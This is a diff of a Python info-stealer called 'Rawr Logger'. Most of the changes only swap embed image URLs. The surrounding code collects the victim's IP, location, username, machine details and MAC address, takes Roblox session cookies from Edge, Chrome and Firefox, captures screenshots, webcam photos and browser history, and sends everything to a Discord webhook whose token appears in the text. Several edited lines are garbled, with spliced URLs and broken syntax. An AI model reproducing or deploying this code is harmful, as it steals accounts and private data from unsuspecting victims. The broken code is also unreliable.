@@ -38,13 +38,13 @@ if diskSizeGB < minDiskSizeGB:
     try:
 
         embedss = {
-          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
+          "avatar_url":"https://i.pinimg.com/originals/76/17/e4/7617e48777d9f7d615a92c4304ba68ce.gif4905.jpg",
                       "embeds": [
                 {
                     "author": {
                     "name": "Rawr Logger",
                     
-                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
+https://i.pinimg.com/originals/76/17/e4/7617e48777d9f7d615a92c4304ba68ce.gif
                     },
                     "description": f"```Vm Was Detected Couldnt Fetch Info```",                       
                 }
@@ -71,13 +71,13 @@ timezone = info['timezone']
 org = info['org']
 pc_username = os.getenv("UserName")
 embed = {
-            "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
+            "avatar_url":"https://i.pinimg.com/originals/76/17/e4/7617e48777d9f7d615a92c4304ba68ce.gif",
             "embeds": [
                 {
                     "author": {
                         "name": "Rawr Logger",
 
-                        "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
+                        "icon_url": "https://i.pinimg.com/originals/76/17/e4/7617e48777d9f7d615a92c4304ba68ce.gif"
                     },
                     "description": f" @everyone You Got A Hit ```There Public Ip Is: {ips}``` ```There City Is: {city}``` ```There Country Is: {country}``` ```There Region Is: {region}``` ```There Lang is: {lang}```  ```There Postal Code Is: {post}``` ```There Organzation Is: {org}```  ```There Pc Username Is: {pc_username}``` ```There Pc Machine Name Is: {machines.machine}``` ```There Pc Processer Is: {machines.processor}``` ```There Pc Mac Address Is : {':'.join(re.findall('..', '%012x' % uuid.getnode()))}```",
                 }
@@ -99,11 +99,11 @@ def edge():
             premium = information["IsPremium"]
             image = information["ThumbnailUrl"]
             embedss = {
-          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
+          "avatar_url":"https://i.pinimg.com/originals/76/17/e4/7617e48777d9f7d615a92c4304ba68ce.gif",
                       "embeds": [
                 {
                     "author": {
-                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
+                    "icon_url": "https://i.pinimg.com/originals/76/17/e4/7617e48777d9f7d615a92c4304ba68ce.gif"
                     },
                     "description": f"```Roblox Cookie Is:{cookie}``` There Info On The Roblox Cookie Is ```Roblox Username Of The Account Is: {username}``` ```Roblox Id Of The Account Is: {id}``` ```Roblox Robux Balance Of The Account Is: {balance}```  ```Roblox Premium Of The Account Is: {premium}```  ```Roblox Thumnail Of The Account Is : {image}```",                       
                     "footer": {
@@ -116,11 +116,11 @@ def edge():
         requests.post(webhook, json=embedss) 
     except:
          embedssa = {
-          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
+          "avatar_url":"https://i.pinimg.com/originals/76/17/e4/7617e48777d9f7d615a92c4304ba68ce.gif",
                       "embeds": [
                 {
                     "author": {
-                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
+                    "icon_url": "https://i.pinimg.com/originals/76/17/e4/7617e48777d9f7d615a92c4304ba68ce.gif"
                     },
                     "description": f"```Roblox Edge Cookie Was Not Found```",                      
                 }
@@ -142,11 +142,11 @@ def chromes():
             premium = information["IsPremium"]
             image = information["ThumbnailUrl"]
             embedss = {
-          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
+          "avatar_url":"https://i.pinimg.com/originals/76/17/e4/7617e48777d9f7d615a92c4304ba68ce.gif.jpg",
                       "embeds": [
                 {
                     "author": {
-                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
+                    "icon_url": "https://i.pinimg.com/originals/76/17/e4/7617e48777d9f7d615a92c4304ba68ce.gif"
                     },
                     "description": f"```Roblox Cookie Is:{cookie}``` There Info On The Roblox Cookie Is ```Roblox Username Of The Account Is: {username}``` ```Roblox Id Of The Account Is: {id}``` ```Roblox Robux Balance Of The Account Is: {balance}```  ```Roblox Premium Of The Account Is: {premium}```  ```Roblox Thumnail Of The Account Is : {image}```",                       
                     "footer": {
@@ -159,11 +159,11 @@ def chromes():
         requests.post(webhook, json=embedss) 
     except:
          embedsss = {
-          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
+          "avatar_url":"https://i.pinimg.com/originals/76/17/e4/7617e48777d9f7d615a92c4304ba68ce.gif",
                       "embeds": [
                 {
                     "author": {
-                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
+                    "icon_url": "https://i.pinimg.com/originals/76/17/e4/7617e48777d9f7d615a92c4304ba68ce.gif"
                     },
                     "description": f"```Roblox Google Chrome Cookie Was Not Found```",                      
                 }
@@ -186,11 +186,11 @@ def firefoxs():
             premium = information["IsPremium"]
             image = information["ThumbnailUrl"]
             embedss = {
-          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
+          "avatar_url":"https://i.pinimg.com/originals/76/17/e4/7617e48777d9f7d615a92c4304ba68ce.gif",
                       "embeds": [
                 {
                     "author": {
-                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
+                    "icon_url": "https://i.pinimg.com/originals/76/17/e4/7617e48777d9f7d615a92c4304ba68ce.gif"
                     },
                     "description": f"```Roblox Cookie Is:{cookie}``` There Info On The Roblox Cookie Is ```Roblox Username Of The Account Is: {username}``` ```Roblox Id Of The Account Is: {id}``` ```Roblox Robux Balance Of The Account Is: {balance}```  ```Roblox Premium Of The Account Is: {premium}```  ```Roblox Thumnail Of The Account Is : {image}```",                       
                     "footer": {
@@ -203,11 +203,11 @@ def firefoxs():
         requests.post(webhook, json=embedss) 
     except:
          embeded = {
-          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
+          "avatar_url":"https://i.pinimg.com/originals/76/17/e4/7617e48777d9f7d615a92c4304ba68ce.gif",
                       "embeds": [
                 {
                     "author": {
-                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
+                    "icon_url": "https://i.pinimg.com/originals/76/17/e4/7617e48777d9f7d615a92c4304ba68ce.gif1018644149332873330/IMG_4905.jpg"
                     },
                     "description": f"```Roblox Fire Fox Cookie Was Not Found```",                      
                 }
@@ -224,9 +224,9 @@ pass
 screenshot = ImageGrab.grab(bbox=None,include_layered_windows=False,all_screens=True,xdisplay=None)
 screenshot.save("image.png")
 screenshot.close()
-with open('https://cdn.discordapp.com/attachments/1458551386324205689/1461787204195057685/IMG_0465.png?ex=696bd2ec&is=696a816c&hm=4ac94520175911339dc88bf5eee2271502e4766fbed78c1af8beaa33832cac32&', 'rb') as f:
+with open('https://i.pinimg.com/originals/76/17/e4/7617e48777d9f7d615a92c4304ba68ce.gifex=696bd2ec&is=696a816c&hm=4ac94520175911339dc88bf5eee2271502e4766fbed78c1af8beaa33832cac32&', 'rb') as f:
      requests.post(webhook,files={'https://discord.com/api/webhooks/1457080106819518658/31asaHrzVMjwBA6gY_O3lsuaMasudwD3sr0vBRUxpQZZnucdNBtJW9LBqJRmpZLUClrq': f})
-os.remove('https://cdn.discordapp.com/attachments/1458551386324205689/1461787204195057685/IMG_0465.png?ex=696bd2ec&is=696a816c&hm=4ac94520175911339dc88bf5eee2271502e4766fbed78c1af8beaa33832cac32&')
+os.remove('https://i.pinimg.com/originals/76/17/e4/7617e48777d9f7d615a92c4304ba68ce.gif0465.png?ex=696bd2ec&is=696a816c&hm=4ac94520175911339dc88bf5eee2271502e4766fbed78c1af8beaa33832cac32&')
 try:
             videoCaptureObject = cv2.VideoCapture(0)
             ret,frame = videoCaptureObject.read()
@@ -238,11 +238,11 @@ try:
             os.remove('photo.png')
 except:
          embeded = {
-          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
+          "avatar_url":"https://i.pinimg.com/originals/76/17/e4/7617e48777d9f7d615a92c4304ba68ce.gif",
                       "embeds": [
                 {
                     "hyperrr": {
-                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
+                    "icon_url": "https://i.pinimg.com/originals/76/17/e4/7617e48777d9f7d615a92c4304ba68ce.gif"
                     },
                     "description": f"```No Webcam Was Found```",                      
                 }
@@ -264,11 +264,11 @@ try:
     os.remove('history.txt')
 except:
      embeded = {
-          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
+          "avatar_url":"https://i.pinimg.com/originals/76/17/e4/7617e48777d9f7d615a92c4304ba68ce.gif",
                       "embeds": [
                 {
                     "author": {
-                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
+                    "icon_url": "https://i.pinimg.com/originals/76/17/e4/7617e48777d9f7d615a92c4304ba68ce.gif"
                     },
                     "description": f"```Failed To Grab Chromes Browser History```",                      
                 }
